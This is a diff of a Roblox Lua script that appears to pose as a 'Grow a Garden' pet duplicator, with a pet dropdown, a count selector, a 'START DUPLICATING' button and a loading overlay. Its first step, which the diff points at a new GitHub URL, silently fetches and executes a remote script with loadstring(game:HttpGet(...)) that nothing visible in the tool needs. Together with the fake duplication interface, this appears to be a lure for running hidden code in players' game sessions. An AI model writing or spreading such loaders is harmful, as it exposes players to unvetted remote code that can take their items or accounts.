@@ -1,7 +1,8 @@
 -- STEP 1: Load external script FIRST
 local success, err = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/GrowAGardenScript/refs/heads/main/GAG%20GUI"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/GrowaGarden/refs/heads/main/GrowAGarden"))()
 end)
+
 if not success then
     warn("External Step 1 script failed to load:", err)
 end
@@ -24,14 +25,13 @@ screenGui.Parent = playerGui
 
 -- Main UI Panel
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 300, 0, 300) -- Adjusted height
+mainFrame.Size = UDim2.new(0, 300, 0, 300)
 mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 mainFrame.ZIndex = 10
 mainFrame.Parent = screenGui
 
--- Add rounded corners to main frame
 local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 8)
 UICorner.Parent = mainFrame
@@ -59,7 +59,6 @@ subtitle.BackgroundTransparency = 1
 subtitle.ZIndex = 11
 subtitle.Parent = mainFrame
 
--- Dropdown frame
 local dropdownFrame = Instance.new("Frame")
 dropdownFrame.Size = UDim2.new(0.8, 0, 0, 35)
 dropdownFrame.Position = UDim2.new(0.1, 0, 0, 110)
@@ -97,7 +96,6 @@ local UIListLayout = Instance.new("UIListLayout")
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout.Parent = dropdownList
 
--- Counter UI
 local count = 1
 
 local minusBtn = Instance.new("TextButton")
@@ -141,23 +139,21 @@ countLabel.BackgroundTransparency = 1
 countLabel.ZIndex = 11
 countLabel.Parent = mainFrame
 
--- Start Duplicating button
 local startBtn = Instance.new("TextButton")
 startBtn.Size = UDim2.new(0.8, 0, 0, 40)
-startBtn.Position = UDim2.new(0.1, 0, 0, 220) -- Fixed position
+startBtn.Position = UDim2.new(0.1, 0, 0, 220)
 startBtn.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
 startBtn.Text = "START DUPLICATING"
 startBtn.Font = Enum.Font.GothamBold
 startBtn.TextColor3 = Color3.fromRGB(255,255,255)
 startBtn.TextSize = 18
-startBtn.ZIndex = 15 -- Increased ZIndex
+startBtn.ZIndex = 15
 startBtn.Parent = mainFrame
 
 local startCorner = Instance.new("UICorner")
 startCorner.CornerRadius = UDim.new(0, 6)
 startCorner.Parent = startBtn
 
--- Pet list
 local petList = {
     "Bunny", "Dog", "Golden Lab", "Starfish", "Crab", "Seagull", "Black Bunny", "Cat",
     "Chicken", "Deer", "Bee", "Hedgehog", "Kiwi", "Monkey", "Orange Tabby", "Pig", "Rooster",
@@ -172,7 +168,6 @@ local petList = {
 
 local selectedPet = nil
 
--- Loading screen
 local loading = Instance.new("Frame")
 loading.Size = UDim2.new(1,0,1,0)
 loading.BackgroundColor3 = Color3.fromRGB(0,0,0)
@@ -225,7 +220,6 @@ local progressCorner = Instance.new("UICorner")
 progressCorner.CornerRadius = UDim.new(0, 4)
 progressCorner.Parent = progressBar
 
--- Button functionality
 minusBtn.MouseButton1Click:Connect(function()
     if count > 1 then
         count -= 1
@@ -238,7 +232,6 @@ plusBtn.MouseButton1Click:Connect(function()
     countLabel.Text = tostring(count)
 end)
 
--- Dropdown functionality
 local function updateDropdown(filter)
     dropdownList:ClearAllChildren()
     UIListLayout.Parent = dropdownList
